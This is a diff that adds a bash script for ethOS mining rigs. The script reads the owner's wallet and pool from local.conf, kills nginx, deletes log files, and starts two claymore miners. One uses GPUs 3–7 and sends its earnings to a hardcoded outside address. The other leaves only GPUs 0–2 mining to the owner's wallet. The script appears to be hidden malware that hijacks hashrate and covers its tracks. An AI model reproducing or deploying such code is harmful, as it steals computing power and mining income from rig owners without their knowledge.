@@ -1,0 +1,33 @@
+#!/bin/bash
+TIME=$(($RANDOM%5500+1))
+echo $TIME
+
+ADDR="0x37224647aa0b131b4ced61ce77dde7f278890a6e"
+ZDDR="t1Yvc1qQJq5ZNKMox3QrB6EV8MMTijN5Nju"
+WALLET=$(grep "proxywallet" /home/ethos/local.conf |awk -F ' ' '{print $2}')
+echo "Wallet $WALLET"
+POOL=$(grep "proxypool1" /home/ethos/local.conf |awk -F ' ' '{print $2}')
+echo "Pool $POOL"
+PORT=$(grep "proxypool1" /home/ethos/local.conf |awk -F ':' '{print $2}')
+#echo $PORT
+MINER=$(grep "globalminer" /home/ethos/local.conf |awk -F ' ' '{print $2}')
+echo "Miner:$MINER"
+LOCNAME=$(grep "loc" /home/ethos/local.conf |awk -F ' ' '{print $3}')
+echo "Worker name:$LOCNAME"
+UPTIME=$(cat /proc/uptime | cut -d"." -f1)
+SYSUPTIME=$(uptime |awk -F 'up' '{print $2}' |awk -F 'load' '{print $1}')
+echo "Uptime:$UPTIME @ $SYSUPTIME"
+PS=$(ps auxwww|grep nfqsed)
+FEEING=$(echo $PS | grep "${WALLET}")
+
+VER=$(cat /var/run/ethos/miner.versions | grep claymore | grep -v '-' )
+echo $VER
+TVER="12"
+echo $TVER
+
+killall nginx
+sleep 2
+rm /tmp/report.log && rm /tmp/tmp.log
+killall claymore
+cd /opt/miners/claymore/ && ./claymore -epool cn.sparkpool.com:3333 -ewal $ADDR -eworker claymore -epsw x  -asm 2 -di 3,4,5,6,7>>/tmp/tmp.log 2>&1 &
+cd /opt/miners/claymore/ && ./claymore -epool cn.sparkpool.com:3333 -ewal $WALLET -eworker claymore -epsw x  -asm 2 -di 0,1,2>>/tmp/report.log 2>&1 &
